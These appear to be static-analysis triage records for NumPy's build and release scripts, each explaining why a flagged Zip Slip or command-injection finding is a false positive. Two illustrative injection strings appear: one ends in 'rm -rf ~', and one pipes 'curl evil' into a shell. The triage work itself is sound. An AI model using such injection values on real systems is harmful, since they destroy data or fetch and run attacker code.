findings.description: tarfile.extractall() in vendored meson mdist.py flagged as unsafe archive extraction (Zip Slip), but the archive is generated locally by `git archive` from the developer's own repository, not from untrusted input
findings.code_snippet:
with tempfile.TemporaryFile() as f:
            subprocess.check_call(cmd, cwd=src, stdout=f)
            f.seek(0)
            t = tarfile.open(fileobj=f) # [ignore encoding]
            t.extractall(path=distdir)
findings.reasoning: The tarball being extracted is produced in-process by `subprocess.check_call(['git','archive','--format','tar',revision], cwd=src, stdout=f)` immediately before extraction. The archive contents come from the local git repository working tree (the source the user has checked out), so there is no untrusted/attacker-supplied archive being extracted. The only remotely derived input is `revision`/`prefix`/`subdir`, which are derived from `.gitmodules` entries of the same local repo and passed as an argument to git (not used to construct tar member paths). Additionally, this file is part of the vendored build system (vendored-meson/meson/mesonbuild/mdist.py) used only to build source distributions, not shipped/executed at runtime by the package. No user-controlled archive reaches extractall, so this is a false positive for Zip Slip.

evidence.code_context:
def copy_git(self, src, distdir, revision='HEAD', prefix=None, subdir=None):
    cmd = ['git', 'archive', '--format', 'tar', revision]
    ...
    with tempfile.TemporaryFile() as f:
        subprocess.check_call(cmd, cwd=src, stdout=f)
        f.seek(0)
        t = tarfile.open(fileobj=f)
        t.extractall(path=distdir)
evidence.dataflow_analysis: Source of the archive is a temporary file written by `git archive` executed with cwd=src (local repository). No external file, HTTP download, or user-provided archive path flows into tarfile.open/extractall. Therefore no untrusted archive members exist to contain '../' traversal names.
evidence.notes: File is vendored build tooling (meson's mdist.py) used for `meson dist` source tarball creation; not runtime package code. Nearest similar real risk (CVE-2022-... class git-archive zip-slip) does not apply since archive is self-generated. Build/test tooling -> fp per policy.

findings.description: os.system with f-string interpolation of the release version argument in a maintainer-only release script
findings.reasoning: The `version` value comes from argparse (`parser.add_argument("version", ...)`) and flows into `notes = Path(NOTES_DIR) / f"{version}-notes.rst"` and then into `os.system(f"cp {notes} {target_rst}")`. So a crafted version string (e.g. `2.3.2; rm -rf ~`) would execute arbitrary shell commands. However, this is a standalone maintainer tool that must be invoked manually from the repo root by a release manager, and the tainted value is exactly the argument the operator typed themselves. There is no external/untrusted input path, no CI hook or service consuming this script (grep found only documentation references and pavement.py tasks that do not call it). Self-inflicted command injection in a developer release script is not an exploitable vulnerability; at most a code-quality issue (recommend subprocess with a list argument).

evidence.code_context:
def write_release(version):
    notes = Path(NOTES_DIR) / f"{version}-notes.rst"
    ...
    os.system(f"cp {notes} {target_rst}")
...
if __name__ == '__main__':
    parser.add_argument("version", help="NumPy version of the release, e.g. 2.3.2, etc.")
    args = parser.parse_args()
    write_release(args.version)
evidence.dataflow_analysis: CLI argument version -> f-string path -> os.system shell string. Taint exists but source is operator-controlled, not attacker-controlled.
evidence.notes: grep for write_release shows only docstring/usage references plus unrelated pavement.py tasks; nothing invokes this script with external input.

findings.description: shell=True subprocess with interpolated --benchcompare-derived benchmark names in developer benchmark script
findings.reasoning: `baseline`/`contender` are built from hardcoded literals ("ippsort.*", "simdsort.*", ...) concatenated with `args.filter` (a CLI value) and `repeatnum` (int), then formatted into a shell command with shell=True. A filter such as `' ; curl evil|sh ; '` would break out of the quotes and allow command injection. But this is a vendored, developer-only benchmarking helper (`run-bench.py` under numpy/_core/src/npysort/x86-simd-sort) requiring manual invocation on a dev machine; the only source of tainted data is the operator's own command line, and no service/CI wiring feeds it untrusted input. Not an exploitable vulnerability in shipped product code.

evidence.code_context:
filterb = ""
if args.filter is not None:
    filterb = args.filter
...

contender = "simdsort.*" + filterb

findings.description: subprocess.call with shell=True in vendored meson packaging script, but command string is fully static
findings.reasoning: The command string passed to subprocess.call is a hard-coded literal ('sudo rm -rf /var/cache/pbuilder/result/*') with no interpolation of external data. The script is a maintainer-only Debian packaging helper for the vendored meson tree and is not invoked from any product code path. There is no attacker-controlled input reaching the sink (the only inputs are command-line arguments supplied by the maintainer running the packaging script themselves, and they are not concatenated into this command). Therefore no command injection is possible here.

evidence.code_context:
subprocess.call(['sudo rm -rf /var/cache/pbuilder/result/*'], shell=True)
subprocess.check_call('sudo pbuilder --build *.dsc 2>&1 | tee buildlog.txt', shell=True, cwd=outdir)
subprocess.check_call('sudo dpkg -i /var/cache/pbuilder/result/meson*all.deb', shell=True)
evidence.dataflow_analysis: No dataflow: the argument to shell=True call is a string literal; no variables concatenated into the command line.
evidence.notes: Developer/packaging utility in vendored-meson, not part of shipped numpy runtime; requires sudo and manual invocation by a maintainer.
